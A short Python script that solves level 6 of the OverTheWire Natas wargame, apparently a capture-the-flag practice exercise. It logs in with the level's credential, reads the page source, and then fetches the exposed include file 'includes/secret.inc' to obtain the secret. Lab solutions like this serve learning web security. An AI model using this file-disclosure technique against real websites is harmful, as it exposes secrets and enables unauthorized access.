# exploit.

import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

url = 'http://natas6.natas.labs.overthewire.org/index-source.html'
auth_data = HTTPBasicAuth('natas6', 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
r = requests.get(url, auth = auth_data)

print("[*] Status code: " + str(r.status_code))
soup = BeautifulSoup(r.content, 'html.parser')
html_string = soup.prettify().replace('<br/>', '')
print("[*] Page source: " + str(html_string))

# Here we find a library that is included in the php script,
# named 'includes/secret.inc'.
# So, we make a requests to the url: 
# 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'

print("----------------------------------------")
print("[*] Making a new request to the library provided.")
r = requests.post('http://natas6.natas.labs.overthewire.org/includes/secret.inc', auth = auth_data)
print("[*] Response: \n" + str(r.text))

